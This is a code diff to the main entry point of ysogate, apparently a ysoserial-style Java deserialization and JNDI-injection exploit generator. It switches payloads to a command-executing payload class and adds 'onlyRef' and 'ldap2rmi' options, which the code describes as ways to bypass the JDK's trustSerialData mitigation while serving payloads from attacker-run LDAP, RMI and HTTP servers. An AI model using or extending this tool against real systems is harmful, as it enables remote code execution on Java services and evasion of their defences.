@@ -10,8 +10,8 @@ import com.h2tg.ysogate.exploit.server.LDAPServer;
 import com.h2tg.ysogate.exploit.server.RMIServer;
 import com.h2tg.ysogate.exploit.server.WebServer;
 import org.apache.commons.cli.*;
-import com.h2tg.ysogate.payloads.ObjectPayload;
-import com.h2tg.ysogate.payloads.ObjectPayload.Utils;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload.Utils;
 import org.apache.commons.codec.binary.Base64OutputStream;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
@@ -77,7 +77,10 @@ public class Main {
                 .addOption("rp", "rmiPort", true, "RMI port")
                 .addOption("lp", "ldapPort", true, "LDAP port")
                 .addOption("hp", "httpPort", true, "HTTP port")
-                .addOption("u", "url", true, "URL for JNDI resource");
+                .addOption("onlyRef", false, "use Reference only to bypass trustSerialData")
+                .addOption("ldap2rmi", false, "change ldap to rmi to bypass trustSerialData")
+//                .addOption("u", "url", true, "URL for JNDI resource")
+        ;
 
         // Add common options to both payload and JNDI options
         for (Option opt : commonOptions.getOptions()) {
@@ -129,6 +132,8 @@ public class Main {
         int ldapPort = cmdLine.getOptionValue("lp") == null ? JndiConfig.ldapPort : Integer.parseInt(cmdLine.getOptionValue("lp"));
         int httpPort = cmdLine.getOptionValue("hp") == null ? JndiConfig.httpPort : Integer.parseInt(cmdLine.getOptionValue("hp"));
         JndiConfig.codebase = "http://" + ip + ":" + httpPort + "/";
+        JndiConfig.ldap2rmi = cmdLine.hasOption("ldap2rmi");
+        JndiConfig.onlyRef = cmdLine.hasOption("onlyRef");
 
 //        printInfo("JNDI Server IP: " + ip);
 //        printInfo("RMI Port: " + rmiPort);
@@ -150,12 +155,12 @@ public class Main {
 
     private static void generatePayload(String payloadType, String parameters) {
         try {
-            final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
+            final Class<? extends CommandObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
             if (payloadClass == null) {
                 throw new IllegalArgumentException("Invalid payload type '" + payloadType + "'");
             }
 
-            ObjectPayload payload = payloadClass.newInstance();
+            CommandObjectPayload payload = payloadClass.newInstance();
             Object object = payload.getObject(parameters);
 
             PAYLOAD = object;
@@ -165,7 +170,7 @@ public class Main {
 
             try (OutputStream out = getOutputStream()) {
                 Serializer.serialize(object, out);
-                ObjectPayload.Utils.releasePayload(payload, object);
+                CommandObjectPayload.Utils.releasePayload(payload, object);
             }
         } catch (Exception e) {
             printError("Error while generating or serializing payload: " + e.getMessage());
@@ -221,16 +226,16 @@ public class Main {
     private static void showPayloads() {
         System.out.println("\r\n");
         System.out.println(PREFIX + "Available payload types:");
-        final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<>(ObjectPayload.Utils.getPayloadClasses());
+        final List<Class<? extends CommandObjectPayload>> payloadClasses = new ArrayList<>(CommandObjectPayload.Utils.getPayloadClasses());
         Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize
 
         final List<String[]> rows = new LinkedList<>();
-        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
-        rows.add(new String[]{"-------", "-------", "------------"});
-        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
+        rows.add(new String[]{"Payload","Dependencies"});
+        rows.add(new String[]{"-------","------------"});
+        for (Class<? extends CommandObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[]{
                     payloadClass.getSimpleName(),
-                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
+//                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                     Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
             });
         }
